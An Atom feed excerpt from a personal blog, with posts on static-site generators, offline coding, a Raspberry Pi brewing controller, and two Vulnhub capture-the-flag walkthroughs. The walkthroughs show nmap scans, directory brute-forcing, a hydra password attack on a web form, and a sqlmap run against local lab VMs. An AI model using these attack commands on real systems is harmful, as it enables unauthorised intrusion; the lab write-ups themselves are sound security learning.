<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Unlogic</title><link href="http://unlogic.co.uk/" rel="alternate"></link><link href="http://unlogic.co.uk/feeds/all.atom.xml" rel="self"></link><id>http://unlogic.co.uk/</id><updated>2016-03-04T00:00:00+00:00</updated><entry><title>Another move</title><link href="http://unlogic.co.uk/2016/03/04/another-move/" rel="alternate"></link><updated>2016-03-04T00:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2016-03-04:2016/03/04/another-move/</id><summary type="html">&lt;p&gt;I can't keep still it seems. After Octopress, Jekyll, and Hugo, this site is now generated by &lt;a class="reference external" href="http://blog.getpelican.com/"&gt;Pelican&lt;/a&gt;.
A few years ago I tried Pelican and wasn't taken by it, which is why I chose Octopress. This got a little too complicated, and
I got very lost when I had to troubleshoot anything. I opted for a simpler version of it, and thus chose Jekyll.&lt;/p&gt;
&lt;p&gt;I liked Jekyll. It was straight forward, easy to use, and did pretty much everything I wanted. Then Hugo came along
and I thought I'd give that a try. It is incredibly fast at generating the static site, I have to admit. It's got a lot of features and seems very
solid. Its biggest plus is that it a single binary. But I fell out of love with it. Trying out different themes was a pain. Each theme put common
attributes like social links, author name etc, under different group or different names. So when you wanted to swap themes, you often had
to edit the config file a lot.&lt;/p&gt;
&lt;p&gt;Then I revisited Pelican and got to know it, and I liked it. Sure, it's not as fast as Hugo, taking around 6-7 seconds to generate this site, but
I have managed to get the site working how I want, very easily. It was still a lot of work, converting all the markdown to rst (didn't have to,
but I chose to do so), but after a few scripts and manual tweaks, I have something that I am happy with.&lt;/p&gt;
&lt;p&gt;So hopefully more posts to come then....&lt;/p&gt;
</summary></entry><entry><title>Offline coding</title><link href="http://unlogic.co.uk/2016/02/16/offline-coding/" rel="alternate"></link><updated>2016-02-16T09:34:12+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2016-02-16:2016/02/16/offline-coding/</id><summary type="html">&lt;p&gt;These days, when you sit at your box, tapping out your code be it in whatever
language you use these days, you usually have one or more tabs open, ready to
help you with any programming issues: DuckDuckGo, Google, Stack Overflow, Reddit,
or whatever your go to site for answers is.&lt;/p&gt;
&lt;p&gt;This is all well and good, and it allows you to solve a problem quickly, usually
in a way that someone else has already proven works. It absolves from having to not
only design and implement your solution, but also from worrying about whether you
did it right. After all, if someone from Stack Overflow with masses of reputation
did it that way, it can't be wrong, can it? Besides, you saved yourself a lot of
time which allows you to move on and get to finishing the rest of the project, right?&lt;/p&gt;
&lt;p&gt;Well, maybe, maybe not. But that's not the point I want to make here. While the
&lt;em&gt;tried and tested&lt;/em&gt; answers are often effective and suitable for your needs, they
don't provide you with something more valuable: exercise. I don't mean squats, or
a big cardio session, I mean mental exercise. It's easy to fall into this trap&lt;/p&gt;
&lt;blockquote&gt;
I've got to parse this text file, capitalise every 10th word, and add a new line
if the line is over 120 characters long. I wonder what the best way to do that is...
I'll just check &amp;lt;insert name of site here&amp;gt; and see what others have done.&lt;/blockquote&gt;
&lt;p&gt;That's great, no one is going to complain that you are being resourceful, and often
project time constraints don't let you spend too much time designing and testing out
various algorithms before you can confidently say: &amp;quot;This is the right way to do it&amp;quot;&lt;/p&gt;
&lt;p&gt;But there are times when you have got that time. Be it a little personal project,
or perhaps your work project has a sane schedule, allowing you to poke around a little
more. For me it's little personal coding projects, things I do because I am curious
how I could implement it. Be that my &lt;a class="reference external" href="https://github.com/Svenito/Langton-Ant"&gt;Langton's Ant&lt;/a&gt;
or &lt;a class="reference external" href="https://github.com/Svenito/Knight-s-Tour"&gt;Knight's tour&lt;/a&gt;. Those are project I coded
offline.&lt;/p&gt;
&lt;p&gt;And when I say offline, I mean I was on some form of public transport at the time,
commuting to work, without any internet what so ever. All I had where offline docs
for any APIs or other, and any other code I wrote in the past for reference. That's it.&lt;/p&gt;
&lt;p&gt;At first it's hard. The temptation to look stuff up, thinking &amp;quot;Someone must have
already done this...&amp;quot; is huge. But you can't. You've unplugged. You have to do
this how &lt;strong&gt;you&lt;/strong&gt; think is right. Even if you don't write any code for the entire
journey, you should be thinking about it, perhaps writing a snippet of code to test
out an idea. Once you've done this for a bit you will start to appreciate how
satisfying it is, writing your own code, without looking up what others have done.
To rely on your knowledge and thought processes to get the job done.&lt;/p&gt;
&lt;p&gt;Not only does it feel good, but you start to retain more information about the API
or language you are using, simply because looking it up is not as easy as typing
some words into a browser. It's much quicker to just grab it from your head. Granted,
you can't retain &lt;strong&gt;all&lt;/strong&gt; the information in your head, in those cases you might need
to get back online and look something up. But the amount of times you need to do that
will decrease.&lt;/p&gt;
&lt;p&gt;So next time you feel like coding a little something, why not unplug from the internet
for an hour or so, and see how you get on. In this age of &lt;em&gt;always connected&lt;/em&gt;, I can
only reccommend that any developer give this a try.&lt;/p&gt;
</summary><category term="tips"></category><category term="coding"></category><category term="programming"></category></entry><entry><title>Brewing with a Pi</title><link href="http://unlogic.co.uk/2015/12/04/brewing-with-a-pi/" rel="alternate"></link><updated>2015-12-04T13:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-12-04:2015/12/04/brewing-with-a-pi/</id><summary type="html">&lt;p&gt;It's been a while since I've written here, but that doesn't mean I haven't
been busy. I've been working on a DIY version of &lt;a class="reference external" href="http://www.speidels-braumeister.de/en/braumeister/id-10-20-50-litre-braumeister.html"&gt;Speidel's Braumeister&lt;/a&gt;
and the software side of things has come along quite nicely.&lt;/p&gt;
&lt;p&gt;The idea is to have a Raspberry Pi controlled beer brewing system for cooking
the wort across a temperature profile. Much like the Braumeister, or Grainfather
style brewers. A probe monitors the temperature and will switch the heating on and
off to maintain the current temperature. You can set how long to hold each temperature
for and it will just plod through the profile.&lt;/p&gt;
&lt;p&gt;You can also set and hold a temperature if you want to simply heat the wort. A
pump running at intervals will also be operational during the brew.&lt;/p&gt;
&lt;p&gt;As I said, the software side is coming along, and I've done a quick test with a Pi
and the DS18B20 thermo probe, and that's also working. Next up I need to
get myself a dedicated Pi (perhaps the new Pi Zero) and the rest of the kit, including
vessels, piping, heating etc. It probably won't be fancy stainless steel like the
Braumeister, but it should achieve the same end result.
Once done I will write a complete build process, and the project will be open
source so everyone can use and improve upon it.&lt;/p&gt;
&lt;p&gt;But more about the software, it's running on &lt;a class="reference external" href="https://cherrypy.org"&gt;CherryPy&lt;/a&gt; and
currently looks like this:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/c4IR4yT.png"&gt;&lt;img alt="" src="http://i.imgur.com/c4IR4yT.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;I've put the &lt;a class="reference external" href="https://github.com/Svenito/brewpy"&gt;code on Github&lt;/a&gt; already, so if
you are keen and fancy building the rest of the kit yourself already, please
check it out.&lt;/p&gt;
&lt;p&gt;Hopefully I'll get the time to put the rest of the project together early
next year. Got a house to get up to speed as well, so time is a little limited.&lt;/p&gt;
</summary></entry><entry><title>SpyderSec solution</title><link href="http://unlogic.co.uk/2015/09/09/spydersec-solution/" rel="alternate"></link><updated>2015-09-09T15:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-09-09:2015/09/09/spydersec-solution/</id><summary type="html">&lt;p&gt;Another day, another VM. Today it's the &lt;a class="reference external" href="https://www.vulnhub.com/entry/spydersec-challenge,128/"&gt;SpyderSec Challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So let me start it up and get on it.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/nah3Wah.gif" /&gt;
&lt;p&gt;As per usual I need the IP of the machine and
the services it has running (if any). Straight from the Unlogic Cookbook&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~/Downloads#&lt;/span&gt; nmap -sn 192.168.56.0/24
&lt;span class="go"&gt;
Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:FF:57:41 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.77 seconds

&lt;/span&gt;&lt;span class="gp"&gt;root&amp;#64;kali:~/Downloads#&lt;/span&gt; nmap -p- -sV 192.168.56.101
&lt;span class="go"&gt;
Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Lucky me, only one service running, and it's good old http at that.
Let's take a look at that page then:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/IiA6MlY.png"&gt;&lt;img alt="" src="http://i.imgur.com/IiA6MlY.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;Without wasting much time, let's get to the clue hunting. First things first: check the source.
And there's clue number one, right between those script tags. It evals a function which seems to
do some text processing. I'll open Firebug to see if that shows anything interesting, and sure
enough&lt;/p&gt;
&lt;pre class="code javascript literal-block"&gt;
&lt;span class="nx"&gt;SyntaxError&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;missing&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;before&lt;/span&gt; &lt;span class="nx"&gt;statement&lt;/span&gt;
    &lt;span class="mi"&gt;61&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;72&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;74&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;d&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;72&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;62&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;69&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;29&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So that's the output from the eval. It throws an error because the result isn't valid
javascript. It seems to me as though it might be HEX. I'll put it through Burp's decoder and
sure enough it resolves to &lt;code&gt;a:l:e:r:t:(:':m:u:l:d:e:r:.:f:b:i:':):;&lt;/code&gt;. That's not going to
affect the page in any way, but I'm sure it's a clue. I'll note it down and carry on exploring.&lt;/p&gt;
&lt;p&gt;The CSS contains a base64 encoded gif. I decided to investigate it by converting it to a file
and opening it in Gimp to examine it. Nothing much of interest there either. Hexdump also shows
nothing of note.&lt;/p&gt;
&lt;p&gt;Ok then, apart from that there's nothing of interest in the source, so let me move onto the images on the page.
There's two images: &lt;code&gt;Challenge.png&lt;/code&gt; and &lt;code&gt;SpyderSecLogo200.png&lt;/code&gt;. On first glance they appear to
have nothing special about them, but once examined with &lt;code&gt;exiftool&lt;/code&gt; I see something of interest&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~/spydersec#&lt;/span&gt; exiftool Challenge.png
&lt;span class="go"&gt;ExifTool Version Number         : 9.74
File Name                       : Challenge.png
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:01 07:25:59+01:00
File Access Date/Time           : 2015:09:09 14:29:25+01:00
File Inode Change Date/Time     : 2015:09:09 14:29:19+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 540
Image Height                    : 540
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:
                                  37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:
                                  34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:
                                  33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
Image Size                      : 540x540&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Hex strings are the order of the day here at SpyderSec. So back to Burp's decoder once more
after removing all the colons. The string decodes to another hex string. Same dance again, and
I get a typical base64 string, decode once more and be rewarded with &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;. Which is
not encoded anymore. I make a note of it and carry on sleuthing.&lt;/p&gt;
&lt;p&gt;Watch out, here comes the reliable &lt;code&gt;dirbuster&lt;/code&gt;. Running it with the regular word list I discover the &lt;code&gt;v&lt;/code&gt; subdirectory.
Browsing to that however merely responds with a &lt;code&gt;403 Forbidden&lt;/code&gt; reply. I've not exhausted all the
nooks and crannies yet, there's still that cookie jar to poke at.&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
Firebug -&amp;gt; Cookie tab -&amp;gt; URI /v/81JHPbvyEQ8729161jd6aKQ0N4/
&lt;/pre&gt;
&lt;p&gt;Another clue.... leading me to a subdirectory under &lt;code&gt;v&lt;/code&gt;. But that's also forbidden. Well, let
me just plug some of the data we've found so far into it. The random characters from the
exif data result in a 404, but the string from the javascript alert box however brings up a
download dialog for a file called &lt;code&gt;mulder.fbi&lt;/code&gt;.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~/spydersec#&lt;/span&gt; wget http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
&lt;span class="go"&gt;--2015-09-09 17:24:38--  http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13960421 (13M) [text/plain]
Saving to: ‘mulder.fbi’

mulder.fbi.1            100%[===============================&amp;gt;]  13.31M  5.52MB/s   in 2.4s

2015-09-09 17:24:41 (5.52 MB/s) - ‘mulder.fbi’ saved [13960421/13960421]

&lt;/span&gt;&lt;span class="gp"&gt;root&amp;#64;kali:~/spydersec#&lt;/span&gt; file mulder.fbi
&lt;span class="go"&gt;mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;A video file, which when I play it, is the song &amp;quot;Twilight Time&amp;quot; by &amp;quot;The Platters&amp;quot;.&lt;/p&gt;
&lt;p&gt;So here I hit another dead end.&lt;/p&gt;
&lt;p&gt;Let me think&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/CbfWCmv.gif" /&gt;
&lt;p&gt;I'll take inventory of the clues I have left now:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;A music video &amp;quot;Twilight time&amp;quot; titled &lt;em&gt;mulder.fbi&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A seeming random string &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So I ask myself, why is a video of a song named &lt;em&gt;mulder.fbi&lt;/em&gt;? So I do a little research
and after searching for &lt;code&gt;the platters &amp;quot;twilight time&amp;quot; x files&lt;/code&gt; I hit this section in a
&lt;a class="reference external" href="https://en.wikipedia.org/wiki/Kill_Switch_(The_X-Files)"&gt;Wikipedia article&lt;/a&gt;&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
When he puts it into the car stereo, it plays &amp;quot;Twilight Time&amp;quot;
by The Platters. However, the agents take it to the Lone Gunmen,
who discover that the disc contains a large quantity of encrypted data
&lt;/pre&gt;
&lt;p&gt;Well if that ain't a clue and a bit! Ok, so a little more research of what data you
can hide in a video file (search for &lt;code&gt;hiding files video mp4&lt;/code&gt;) I am directed to a
&lt;a class="reference external" href="http://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file"&gt;Lifehacker article&lt;/a&gt;
describing the process of hiding Truecrypt volumes in MP4s. It mentions a few ways to
detect such a volume in a video, but to be honest, I might as well just try and mount the volume.
That should be the easiest and quickest way to see if I am on the right track.&lt;/p&gt;
&lt;p&gt;Sure enough, there's a volume in the video, but it needs a password. Well there's only
one unused piece of the puzzle left. I plug that in and there's our volume with the &lt;code&gt;flag.txt&lt;/code&gt; file
which contains:&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
Congratulations!

You are a winner.

Please leave some feedback on your thoughts regarding this challenge.
Was it fun? Was it hard enough or too easy?
What did you like or dislike, what could be done better?

https://www.spydersec.com/feedback
&lt;/pre&gt;
&lt;p&gt;Well that was a nice challenge, especially the truecrypt volume in the MP4. That's
something new I learned from this. So thanks to &lt;a class="reference external" href="https://twitter.com/Spydersec"&gt;&amp;#64;SpyderSec&lt;/a&gt;
for the challenge, and thanks to you for stopping by to read this.&lt;/p&gt;
</summary></entry><entry><title>Extracting bup files in Linux</title><link href="http://unlogic.co.uk/2015/09/03/extracting-bup-files-in-linux/" rel="alternate"></link><updated>2015-09-03T14:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-09-03:2015/09/03/extracting-bup-files-in-linux/</id><summary type="html">&lt;p&gt;I recently got hold of some malware that got snapped up by McAfee and stored in a bup file.
Keen to take a look at it, I researched how to 'unbup' files and found this page:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://blog.opensecurityresearch.com/2012/07/unbup-mcafee-bup-extractor-for-linux.html"&gt;http://blog.opensecurityresearch.com/2012/07/unbup-mcafee-bup-extractor-for-linux.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A slow bash script? A faster script in Perl? No, that won't do. Rather than search
for a Python implementation I decided to use this as an opportunity to write
something, and thus my &lt;cite&gt;unbup.py&lt;/cite&gt; was born. You can get it from my &lt;a class="reference external" href="https://github.com/Svenito/unbup"&gt;GitHub&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It's about as simple as the bash script in terms of features, but it works, and
it is also fairly fast. I've only tested it with the one file I have, but if
you decide to use it, and it doesn't work, send me the bup file and I'll take a look
at fixing it. Otherwise feel free to fork it and make your own fixes.&lt;/p&gt;
</summary></entry><entry><title>Nullbyte 1 solution</title><link href="http://unlogic.co.uk/2015/08/25/nullbyte-1-solution/" rel="alternate"></link><updated>2015-08-25T11:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-08-25:2015/08/25/nullbyte-1-solution/</id><summary type="html">&lt;p&gt;I've been AFK for a while because of various reasons, but now I'm back and have
managed to scrape a little time together to get on with some of &lt;a class="reference external" href="https://vulnhub.com"&gt;Vulnhub's&lt;/a&gt;
new VMs.&lt;/p&gt;
&lt;p&gt;So let's start with &lt;a class="reference external" href="https://www.vulnhub.com/entry/nullbyte-1,126/"&gt;Nullbyte 1&lt;/a&gt;&lt;/p&gt;
&lt;div class="section" id="stage-1"&gt;
&lt;h2&gt;Stage 1&lt;/h2&gt;
&lt;p&gt;I ran the usual service discovery and found:&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
root&amp;#64;kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2015-08-25 11:29 BST
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 192.168.56.101
Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.00057s latency&lt;span class="o"&gt;)&lt;/span&gt;.
Not shown: &lt;span class="m"&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 &lt;span class="o"&gt;((&lt;/span&gt;Debian&lt;span class="o"&gt;))&lt;/span&gt;
111/tcp open  rpcbind 2-4 &lt;span class="o"&gt;(&lt;/span&gt;RPC &lt;span class="c1"&gt;#100000)
&lt;/span&gt;777/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;protocol 2.0&lt;span class="o"&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/pre&gt;
&lt;p&gt;HTTP server on 80 and ssh on 777. I'm going to take the straightforward one, and head
to the HTTP server first.&lt;/p&gt;
&lt;p&gt;Upon opening the page I only get an image and some text&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/SlVGKol.png" /&gt;
&lt;p&gt;I ran &lt;code&gt;dirbuster&lt;/code&gt; on the root and got a couple of hits: &lt;code&gt;uploads&lt;/code&gt; and &lt;code&gt;phpmyadmin&lt;/code&gt;. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.&lt;/p&gt;
&lt;p&gt;The source of the page doesn't reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn't appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
root&amp;#64;kali:~/Downloads# exiftool main.gif
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : &lt;span class="m"&gt;16&lt;/span&gt; kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-&lt;span class="o"&gt;)&lt;/span&gt;: kzMb5nVYJw
Image Size                      : 235x302
&lt;/pre&gt;
&lt;p&gt;Hrmm, that comment looks unusual. Let's try that in the URL. Initially I got a 404
but that's because I didn't remove the &lt;code&gt;P-): `. Hitting :code:`http://192.168.56.101/kzMb5nVYJw&lt;/code&gt;
takes me to a form asking for a key.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="stage-2"&gt;
&lt;h2&gt;Stage 2&lt;/h2&gt;
&lt;p&gt;Typing in something random just shows &lt;code&gt;invalid key&lt;/code&gt;. Ok, let me take a look at the source,
see where this thing goes.&lt;/p&gt;
&lt;pre class="code html literal-block"&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt; &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
Key:&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- this form isn't connected to mysql, password ain't that complex --!&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Ok, so no SQLi here then, and the password isn't complex either. I'm guessing
a simple wordlist might solve this for me. Time to break out &lt;code&gt;hydra&lt;/code&gt; for this:&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
root&amp;#64;kali:~# hydra 192.168.56.101 http-form-post &lt;span class="s2"&gt;&amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot;&lt;/span&gt; -l x -P /usr/share/dict/words -t &lt;span class="m"&gt;10&lt;/span&gt; -w 30
Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-08-25 11:41:58
&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;10&lt;/span&gt; tasks per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;99171&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:99171&lt;span class="o"&gt;)&lt;/span&gt;, ~154 tries per task
&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; 18687.00 tries/min, &lt;span class="m"&gt;18687&lt;/span&gt; tries in 00:01h, &lt;span class="m"&gt;80484&lt;/span&gt; todo in 00:05h, &lt;span class="m"&gt;10&lt;/span&gt; active
&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-post-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.56.101   login: x   password: elite
&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/pre&gt;
&lt;p&gt;Bingo. Once I enter that into the field I am able to search for usernames.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="stage-3"&gt;
&lt;h2&gt;Stage 3&lt;/h2&gt;
&lt;p&gt;Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don't do much, entering nothing dumps multiple records. Maybe I will
try to &lt;code&gt;sqlmap&lt;/code&gt; the URL to see if there's any vulnerabilities there&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
root&amp;#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span class="o"&gt;=&lt;/span&gt;

&amp;lt;snip&amp;gt;

